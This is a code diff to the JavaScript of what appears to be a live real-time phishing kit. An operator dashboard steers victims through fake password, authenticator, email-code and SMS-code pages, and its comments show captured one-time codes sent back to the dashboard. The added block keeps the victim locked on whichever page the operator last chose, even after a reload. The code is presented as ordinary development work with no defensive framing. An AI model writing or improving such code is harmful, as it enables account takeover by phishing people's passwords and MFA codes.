@@ -4,7 +4,30 @@
   const SESSION_STORAGE_KEY = "sessionID";
   const JOIN_EVENT = "client-join";   // matches your dashboard
   const EMIT_EVENT = "client-data";   // payload: { type:'gauth', value:'123456', sessionID }
-
+// ADD THIS BLOCK
+const PAGE_FILE_MAP = {
+  app:              "app.html",
+  wrong_password:   "app.html",
+  loading:          "loading.html",
+  gauth:            "auth.html",
+  wrong_gauth:      "auth.html",
+  email_code:       "email.html",
+  wrong_email_code: "email.html",
+  sms:              "sms.html",
+  wrong_sms:        "sms.html"
+};
+const THIS_PAGE = "email.html";
+function setTrackedPage(buttonName) {
+  const dest = PAGE_FILE_MAP[String(buttonName || "").trim().toLowerCase()];
+  if (dest) { try { localStorage.setItem("page", dest); } catch {} }
+}
+(function checkTrackedPage() {
+  try {
+    const stored = localStorage.getItem("page");
+    if (stored && stored !== THIS_PAGE) location.href = stored;
+  } catch {}
+})();
+// END ADD
 // Where to go for each MFA/dashboard signal
 // NOTE: No redirects for sms / wrong_sms. GAUTH redirects to auth.html.
 // NOTE: Redirect on sms / wrong_sms to sms.html. No redirect for email_code / wrong_email_code.
@@ -83,6 +106,7 @@ const MFA_REDIRECT = {
     socket.on("disconnect", () => console.log("[auth.js] disconnected"));
         // Clear the persisted spinner once dashboard responds to gauth
     socket.on("dashboard-action", ({ buttonName }) => {
+      setTrackedPage(buttonName);
       const key = String(buttonName || "").toLowerCase();
       const dest = MFA_REDIRECT[key];
 
